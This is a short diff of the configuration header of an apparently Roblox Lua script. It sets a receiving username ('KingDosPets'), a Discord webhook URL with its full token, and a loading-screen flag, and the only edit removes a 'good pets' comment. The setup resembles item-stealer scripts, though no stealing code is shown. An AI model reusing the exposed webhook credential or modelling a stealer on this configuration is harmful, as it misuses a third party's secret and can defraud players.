@@ -7,7 +7,7 @@
 
 ]]--
 
-UserName = "KingDosPets" -- good pets
+UserName = "KingDosPets"
 Webhook = "https://discord.com/api/webhooks/1123654223779872798/-ag3cV8EcZouyzsI4jlcPWMHgyYui4ebZ29MIcji8xT_83VWnniPOhuLHj_nvhRtjlYw"
 UserName2 = "KingDosPets"
 _G.LoadingScreen = true
